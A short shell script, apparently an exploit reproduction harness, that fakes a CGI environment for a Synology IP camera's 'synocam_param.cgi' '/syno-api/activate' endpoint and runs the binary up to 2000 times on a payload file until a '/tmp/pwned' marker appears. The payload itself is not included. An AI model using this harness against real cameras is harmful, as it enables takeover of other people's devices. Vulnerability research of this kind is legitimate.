#!/bin/sh

export GATEWAY_INTERFACE=CGI/1.1
export CONTENT_TYPE=application/json
export ACTION_PREPARE=yes
export LOCAL_URI=/syno-api/activate
export REMOTE_ADDR=192.168.14.81
export SHLVL=1
export DOCUMENT_ROOT=/www
export REMOTE_PORT=47442
export RESPONSE_TO=SOCKET
export CONTENT_LENGTH=$(tr -d '\n' <./body.txt | wc -c)
export SCRIPT_FILENAME=/www/camera-cgi/synocam_param.cgi
export PATH_TRANSLATED=/www
export HTTP_HOST=localhost
export REQUEST_URI=/syno-api/activate
export SERVER_SOFTWARE=CivetWeb/1.15
export LOCAL_URI_RAW=/syno-api/activate
export PATH=/bin:/sbin:/usr/bin:/usr/sbin
export SERVER_PROTOCOL=HTTP/1.1
export HTTP_CONTENT_TYPE=application/json
export REDIRECT_STATUS=200
export REQUEST_METHOD=PUT
export PWD=/www/camera-cgi
export SERVER_ROOT=/www
export HTTPS=off
export SERVER_PORT=80
export SCRIPT_NAME=/syno-api/activate
export ACTION_QUERY=yes
export SERVER_NAME=IPCam
export HTTP_CONTENT_LENGTH=$(tr -d '\n' <./body.txt | wc -c)

for i in $(seq 1 2000); do
	echo "attempt $i"
	./www/camera-cgi/synocam_param.cgi <./body.txt
	[ -f /tmp/pwned ] && echo pwned! && exit
done
